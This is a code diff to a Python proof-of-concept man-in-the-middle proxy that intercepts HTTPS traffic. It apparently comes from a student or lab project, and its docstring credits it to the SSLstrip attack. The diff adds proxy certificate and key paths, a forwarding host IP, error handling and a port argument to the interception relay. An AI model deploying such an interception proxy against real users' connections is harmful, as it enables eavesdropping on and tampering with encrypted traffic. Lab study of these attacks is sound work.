@@ -2,8 +2,7 @@
 # -*- coding: utf-8
 
 """
-This script is a Poc of the SSLstrip attack presented by Moxie at the BlackHat
-conference, in 2008.
+This script is a Poc of HTTPS interception made by a MITM opponent.
 """
 
 __author__  = 'Amélie Risi, Brendan Guevel and Simon Duret'
@@ -14,10 +13,13 @@ __status__  = 'Development'
 
 import select, socket, ssl, sys, re
 
-FORWARD_HOST        = 'www.t0x0sh.org'
+FORWARD_HOST        = '147.210.12.1'
 FORWARD_PORT        = 443
+FORWARD_CERT        = '/mnt/host/cert.pem'
 PROXY_HOST          = '0.0.0.0'
 PROXY_PORT          = 4242
+PROXY_CERT          = '/mnt/host/proxy-cert.pem'
+PROXY_KEY           = '/mnt/host/proxy-key.pem'
 BUFFER_SIZE         = 65537
 
 class HTTPSInterception:
@@ -32,7 +34,7 @@ class HTTPSInterception:
     def __listen(self):
         sock = socket.socket()
         context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
-        context.load_cert_chain(certfile="ca.crt", keyfile="ca.key")
+        context.load_cert_chain(certfile=PROXY_CERT, keyfile=PROXY_KEY)
 
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         sock.bind((PROXY_HOST, PROXY_PORT))
@@ -43,6 +45,7 @@ class HTTPSInterception:
     def __new_https_conn(self, csock):
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         ssl_ctx = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
+        ssl_ctx.load_verify_locations(FORWARD_CERT)
         sock = ssl_ctx.wrap_socket(sock, server_hostname=FORWARD_HOST)
         sock.connect((FORWARD_HOST, FORWARD_PORT))
         self.__csockets[csock] = sock
@@ -50,8 +53,11 @@ class HTTPSInterception:
 
     def __recv(self, csock):
         fw_sock = self.__csockets[csock]
-        data = csock.recv(BUFFER_SIZE)
-        if len(data) == 0:
+        try:
+            data = csock.recv(BUFFER_SIZE)
+            if len(data) == 0:
+                raise
+        except:
             self.__close_conn(csock)
             self.__close_conn(fw_sock)
         else:
@@ -92,5 +98,7 @@ class HTTPSInterception:
                     self.__recv(s)
 
 if __name__ == "__main__":
+    if len(sys.argv) > 1:
+        PROXY_PORT = int(sys.argv[1])
     httpsinterception = HTTPSInterception()
     httpsinterception.run()
